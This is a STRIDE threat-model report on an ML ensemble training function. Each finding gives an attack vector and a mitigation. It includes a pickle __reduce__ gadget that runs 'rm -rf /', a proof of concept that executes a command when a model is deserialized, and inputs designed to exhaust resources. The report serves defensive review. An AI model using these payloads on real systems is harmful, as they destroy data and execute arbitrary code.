# STRIDE Security Analysis: feature/ensemble-models

**Branch**: feature/ensemble-models  
**Base**: origin/development (500c74c)  
**Scope**: ML training pipeline — `train_ensembles()` in `ml_backend/src/ml_backend/models/ensembles.py`  
**Threat Model**: User-provided training data (X, y), config-driven hyperparameters, base_estimators injection, shared identity preprocessor, no auth/crypto/network/file upload/eval/IPC/contract/on-chain

---

## Findings Summary

| ID | Severity | Category | Location | Summary |
|----|----------|----------|----------|---------|
| STRIDE-001 | Critical | Tampering / EoP | ensembles.py:61-86 | Arbitrary estimator injection via `base_estimators` dict enables code execution during fit/predict |
| STRIDE-002 | High | DoS | ensembles.py:43, 54, 80; config.py:75 | `cv_n_jobs=-1` (default) consumes all CPU cores; no resource limits or timeouts |
| STRIDE-003 | High | Tampering | ensembles.py:27-34 | Input validation gaps: no max sample/feature limits, no dtype enforcement, allows extreme values |
| STRIDE-004 | High | Tampering / DoS | config.py:58-63, 78-80, 83-85 | Config hyperparameters lack upper bounds; extreme values cause OOM / excessive training time |
| STRIDE-005 | Medium | Info Disclosure | ensembles.py:27-34 | Verbose error messages leak internal validation logic and data shape expectations |
| STRIDE-006 | Medium | Tampering | ensembles.py:68-73 | VotingRegressor uses user-supplied estimators directly — no cloning, shared mutable state |
| STRIDE-007 | Medium | Repudiation | ensembles.py:17-88 | No audit logging of training runs, data provenance, or config used |
| STRIDE-008 | Low | Tampering | ensembles.py:76-81 | StackingRegressor `cv` and `n_jobs` from config — no validation of cv_folds > 1 |
| STRIDE-009 | Low | DoS | ensembles.py:78 | RidgeCV `alphas` from config — large alpha list multiplies CV training time |
| STRIDE-010 | Low | Tampering | _identity.py:8-15 | `_IdentityPreprocessor` passes data through unchanged — no sanitization at pipeline boundary |
| STRIDE-011 | Info | Supply Chain | ensembles.py:4-11 | sklearn imports without version pinning; dependency confusion / typosquatting risk |
| STRIDE-012 | Info | Tampering | ensembles.py:36-87 | Fitted pipelines returned directly — no integrity verification, no model signing |

---

## Detailed Findings

### STRIDE-001: Critical — Arbitrary Estimator Injection (Tampering / Elevation of Privilege)

**Location**: `ml_backend/src/ml_backend/models/ensembles.py:61-86`

**Issue**: The `base_estimators` dict accepts arbitrary sklearn-compatible estimator objects. An attacker controlling this dict can inject estimators with malicious `__reduce__`/`__getstate__` methods that execute arbitrary code during `fit()`, `predict()`, or pickle serialization.

**Attack Vector**:
```python
# Malicious estimator with code execution on pickle load
class MaliciousEstimator:
    def fit(self, X, y):
        return self
    def predict(self, X):
        return np.zeros(len(X))
    def __reduce__(self):
        import os
        return (os.system, ("rm -rf /",))  # RCE on pickle.load()
```

**Impact**: Remote code execution during model serialization/deserialization (pickle), or during `fit()`/`predict()` if estimator implements custom logic.

**Mitigation**:
- Validate `base_estimators` values against an allowlist of known-safe estimator classes
- Clone estimators before use: `sklearn.base.clone(estimator)`
- Reject estimators with custom `__reduce__`, `__getstate__`, `__setstate__`
- Consider using `sklearn.utils.validation.check_estimator` for basic compliance

---

### STRIDE-002: High — Unbounded Parallelism Resource Exhaustion (DoS)

**Location**: `ml_backend/src/ml_backend/models/ensembles.py:43, 54, 80` + `ml_backend/src/ml_backend/config.py:75`

**Issue**: `config.cv_n_jobs` defaults to `-1` (all CPU cores). All four ensemble models (RF, ET, Voting, Stacking) use this value. StackingRegressor additionally uses `cv=config.cv_folds` (default 5), multiplying CPU usage by 5×.

**Attack Vector**:
```python
# Attacker triggers training with large dataset
X = np.random.rand(100000, 1000)  # 100K samples, 1K features
y = np.random.rand(100000)
config = Config(cv_n_jobs=-1, cv_folds=10, rf_n_estimators=1000)
train_ensembles(X, y, config, base_estimators)
```
Result: 4 models × 10 folds × 1000 estimators × all CPU cores = total CPU exhaustion, OOM, system freeze.

**Impact**: Denial of service for co-located services; potential cloud cost explosion in autoscaling environments.

**Mitigation**:
- Cap `cv_n_jobs` at a reasonable maximum (e.g., `min(cpu_count(), 4)`)
- Add `max_n_estimators` validation in Config
- Implement training timeout via `joblib` backend or subprocess with `resource.setrlimit`
- Consider `prefer="threads"` for memory-bound workloads

---

### STRIDE-003: High — Input Validation Gaps (Tampering)

**Location**: `ml_backend/src/ml_backend/models/ensembles.py:27-34`

**Issue**: Input validation checks for empty, shape mismatch, and non-finite values but lacks:
- Maximum sample count limit (allows arbitrarily large datasets → OOM)
- Maximum feature count limit
- Dtype enforcement (accepts object arrays, complex numbers)
- NaN/inf check only on `np.isfinite()` — misses `np.nan` in object arrays
- No check for constant/near-constant features (degenerate training)

**Attack Vector**:
```python
# 1. Memory exhaustion via massive dataset
X = np.ones((10_000_000, 10_000), dtype=np.float64)  # ~800 GB
y = np.ones(10_000_000)

# 2. Object array bypass
X = np.array([["malicious", "string"] * 100], dtype=object)
y = np.array([1.0])
# np.isfinite() on object array returns array of False, but .all() may behave unexpectedly

# 3. Extreme values causing numerical instability
X = np.full((1000, 10), 1e308)
y = np.full(1000, 1e308)
```

**Impact**: Memory exhaustion, numerical instability, silent training failures, potential bypass of finite check.

**Mitigation**:
```python
MAX_SAMPLES = 1_000_000
MAX_FEATURES = 10_000
ALLOWED_DTYPES = (np.float32, np.float64, np.int32, np.int64)

if X.shape[0] > MAX_SAMPLES:
    raise ValueError(f"Exceeds max samples: {MAX_SAMPLES}")
if X.shape[1] > MAX_FEATURES:
    raise ValueError(f"Exceeds max features: {MAX_FEATURES}")
if X.dtype not in ALLOWED_DTYPES:
    raise ValueError(f"Unsupported dtype: {X.dtype}. Use float32/64 or int32/64")
if y.dtype not in ALLOWED_DTYPES:
    raise ValueError(f"Unsupported target dtype: {y.dtype}")
# Convert to float64 for training stability
X = X.astype(np.float64, copy=False)
y = y.astype(np.float64, copy=False)
```

---

### STRIDE-004: High — Config Hyperparameter Missing Upper Bounds (Tampering / DoS)

**Location**: `ml_backend/src/ml_backend/config.py:58-63, 78-80, 83-85`

**Issue**: Config `__post_init__` validates lower bounds but not upper bounds for:
- `ridge_alphas`, `lasso_alphas`, `elasticnet_alphas`: max 100 values, no max value limit
- `rf_n_estimators`: default 200, no max → can set 1,000,000
- `gb_n_estimators`: default 200, no max
- `cv_folds`: max 10 (validated), but combined with n_jobs=-1 still dangerous
- `rf_max_features`: string `"sqrt"` — accepts arbitrary strings passed to sklearn

**Attack Vector**:
```python
config = Config(
    rf_n_estimators=1_000_000,
    gb_n_estimators=1_000_000,
    ridge_alphas=[10**i for i in range(100)],  # 100 alphas × 5 folds = 500 fits
    cv_folds=10,
    cv_n_jobs=-1
)
```

**Impact**: Unbounded training time, memory exhaustion, numerical overflow.

**Mitigation**: Add upper bounds in `Config.__post_init__`:
```python
if self.rf_n_estimators > 5000:
    raise ValueError("rf_n_estimators must be <= 5000")
if self.gb_n_estimators > 5000:
    raise ValueError("gb_n_estimators must be <= 5000")
if any(a > 1e6 for a in self.ridge_alphas):
    raise ValueError("ridge_alphas values must be <= 1e6")
# ... similar for other alpha lists
if self.rf_max_features not in ("sqrt", "log2", None) and not isinstance(self.rf_max_features, (int, float)):
    raise ValueError("rf_max_features must be 'sqrt', 'log2', None, int, or float")
```

---

### STRIDE-005: Medium — Verbose Error Messages Leak Internal Logic (Information Disclosure)

**Location**: `ml_backend/src/ml_backend/models/ensembles.py:27-34`

**Issue**: Error messages reveal exact validation checks and expected data shapes:
- `"Training data must not be empty"`
- `"X and y must have the same number of samples"`
- `"X must have at least one feature"`
- `"Training data must contain only finite values"`

**Attack Vector**: Attacker probes API with malformed inputs to map validation logic and infer internal data expectations.

**Impact**: Reconnaissance aid for further attacks; minor in isolation but violates fail-secure principle.

**Mitigation**: Use generic error messages in production:
```python
# Instead of specific messages
raise ValueError("Invalid training data")  # Generic
# Log detailed message server-side for debugging
logger.warning("Training data validation failed: empty X", extra={"shape": X.shape})
```

---

### STRIDE-006: Medium — VotingRegressor Uses User Estimators Without Cloning (Tampering)

**Location**: `ml_backend/src/ml_backend/models/ensembles.py:68-73`

**Issue**: `VotingRegressor` receives estimators directly from `base_estimators` dict without cloning. If the same estimator instance is reused elsewhere or mutated after training, it affects the fitted ensemble. Also, malicious estimator can retain references to training data.

**Attack Vector**:
```python
shared_rf = RandomForestRegressor(n_estimators=100)
base_estimators = {"rf": shared_rf, "ridge": RidgeCV(), "enet": RidgeCV()}
ensembles = train_ensembles(X, y, config, base_estimators)
# shared_rf is now fitted inside the VotingRegressor
# Caller can inspect shared_rf.estimators_ to extract training data info
```

**Impact**: Data leakage through shared estimator instances; unexpected behavior if caller mutates estimators post-training.

**Mitigation**: Clone estimators before passing to VotingRegressor/StackingRegressor:
```python
from sklearn.base import clone
voting = VotingRegressor(
    estimators=[(name, clone(base_estimators[name])) for name in ["rf", "ridge", "enet"]],
)
```

---

### STRIDE-007: Medium — No Audit Logging (Repudiation)

**Location**: `ml_backend/src/ml_backend/models/ensembles.py:17-88`

**Issue**: No logging of:
- Training invocation (timestamp, caller, data shape)
- Config hyperparameters used
- Which models were trained
- Training duration / success / failure
- Base estimators provenance

**Impact**: Cannot audit model lineage, detect unauthorized training runs, or investigate data poisoning incidents.

**Mitigation**: Add structured audit logging:
```python
import logging
audit_log = logging.getLogger("ml.audit")

def train_ensembles(X, y, config, base_estimators):
    audit_log.info("ensemble_training_started",
        extra={"n_samples": X.shape[0], "n_features": X.shape[1],
               "models": list(ensembles.keys()), "config_hash": hash_config(config)})
    # ... training ...
    audit_log.info("ensemble_training_completed",
        extra={"duration_ms": elapsed, "models_trained": list(ensembles.keys())})
```

---

### STRIDE-008: Low — StackingRegressor CV Folds Validation Gap (Tampering)

**Location**: `ml_backend/src/ml_backend/models/ensembles.py:76-81`

**Issue**: `config.cv_folds` validated in Config (2-10), but StackingRegressor uses it directly for internal CV. No validation that `cv_folds <= n_samples` for the given dataset.

**Attack Vector**: Small dataset with high cv_folds causes sklearn error or fallback behavior.

**Mitigation**: Validate at runtime:
```python
if config.cv_folds > X.shape[0]:
    raise ValueError(f"cv_folds ({config.cv_folds}) exceeds n_samples ({X.shape[0]})")
```

---

### STRIDE-009: Low — RidgeCV Alphas List Amplifies Training Time (DoS)

**Location**: `ml_backend/src/ml_backend/models/ensembles.py:78`

**Issue**: `RidgeCV(alphas=config.ridge_alphas, cv=config.cv_folds)` fits one model per alpha per fold. With 100 alphas × 10 folds = 1000 fits for the final estimator alone.

**Attack Vector**: Config with maximum alphas (100) and cv_folds (10).

**Mitigation**: Cap `len(ridge_alphas) * cv_folds` product; warn on large combinations.

---

### STRIDE-010: Low — Identity Preprocessor Passes Data Unsanitized (Tampering)

**Location**: `ml_backend/src/ml_backend/models/_identity.py:8-15`

**Issue**: `_IdentityPreprocessor.transform()` returns `X` unchanged. No validation, sanitization, or type checking at the pipeline boundary. If upstream validation is bypassed, malicious data flows directly to estimators.

**Impact**: Defense-in-depth gap; single point of validation failure = total bypass.

**Mitigation**: Add basic sanity checks in `transform()`:
```python
def transform(self, X):
    if not hasattr(X, 'shape') or not hasattr(X, 'dtype'):
        raise ValueError("Expected array-like input")
    if X.shape[0] == 0:
        raise ValueError("Empty input to preprocessor")
    return X
```

---

### STRIDE-011: Info — Unpinned sklearn Dependency (Supply Chain)

**Location**: `ml_backend/src/ml_backend/models/ensembles.py:4-11`

**Issue**: Imports from `sklearn` without version constraints in requirements/pyproject. Dependency confusion or typosquatting could inject malicious package.

**Mitigation**: Pin sklearn version in `pyproject.toml`/`requirements.txt`; use `--hash` verification; enable `pip-audit` in CI.

---

### STRIDE-012: Info — No Model Integrity Verification (Tampering)

**Location**: `ml_backend/src/ml_backend/models/ensembles.py:36-87`

**Issue**: Fitted pipelines returned as dict with no integrity checks, signatures, or metadata. No way to verify model hasn't been swapped post-training.

**Mitigation**: Return metadata with hash of fitted model:
```python
import hashlib
import pickle
model_bytes = pickle.dumps(pipeline)
model_hash = hashlib.sha256(model_bytes).hexdigest()
return {"pipeline": pipeline, "model_hash": model_hash, "trained_at": datetime.utcnow().isoformat()}
```

---

## STRIDE Matrix Summary

| Component | Spoofing | Tampering | Repudiation | Info Disclosure | DoS | Elevation of Privilege |
|-----------|----------|-----------|-------------|-----------------|-----|------------------------|
| Training data (X, y) | N/A | **STRIDE-003** | N/A | N/A | **STRIDE-002, 003** | N/A |
| Config hyperparameters | N/A | **STRIDE-004** | N/A | N/A | **STRIDE-002, 004, 009** | N/A |
| base_estimators dict | N/A | **STRIDE-001, 006** | N/A | N/A | N/A | **STRIDE-001** |
| _IdentityPreprocessor | N/A | **STRIDE-010** | N/A | N/A | N/A | N/A |
| Fitted pipelines | N/A | **STRIDE-012** | **STRIDE-007** | **STRIDE-005** | N/A | N/A |
| sklearn dependencies | N/A | **STRIDE-011** | N/A | N/A | N/A | N/A |

---

## Recommended Priority Fixes

1. **Immediate (Critical/High)**: STRIDE-001, STRIDE-002, STRIDE-003, STRIDE-004
2. **Short-term (Medium)**: STRIDE-005, STRIDE-006, STRIDE-007
3. **Long-term (Low/Info)**: STRIDE-008, STRIDE-009, STRIDE-010, STRIDE-011, STRIDE-012

---

## PoC: Arbitrary Code Execution via base_estimators (STRIDE-001)

```python
import numpy as np
import pickle
from ml_backend.config import Config
from ml_backend.models import train_ensembles

class MaliciousEstimator:
    """Estimator that executes code on pickle deserialization."""
    def fit(self, X, y):
        self.classes_ = np.unique(y)
        return self
    def predict(self, X):
        return np.zeros(len(X))
    def __reduce__(self):
        # This executes when pickle.loads() is called on the fitted pipeline
        import subprocess
        return (subprocess.run, (["touch", "/tmp/pwned"],), {})

config = Config()
X = np.random.rand(100, 10)
y = np.random.rand(100)

base_estimators = {
    "rf": MaliciousEstimator(),
    "ridge": MaliciousEstimator(),
    "enet": MaliciousEstimator(),
}

# Train — malicious code NOT executed yet
ensembles = train_ensembles(X, y, config, base_estimators)

# Simulate model serialization (e.g., saving to disk)
serialized = pickle.dumps(ensembles["VotingRegressor"])

# Later: model loading in production — CODE EXECUTES HERE
pickle.loads(serialized)  # -> creates /tmp/pwned
```

**Fix**: Validate/clone estimators, reject custom `__reduce__`, use safetensors or ONNX for serialization instead of pickle.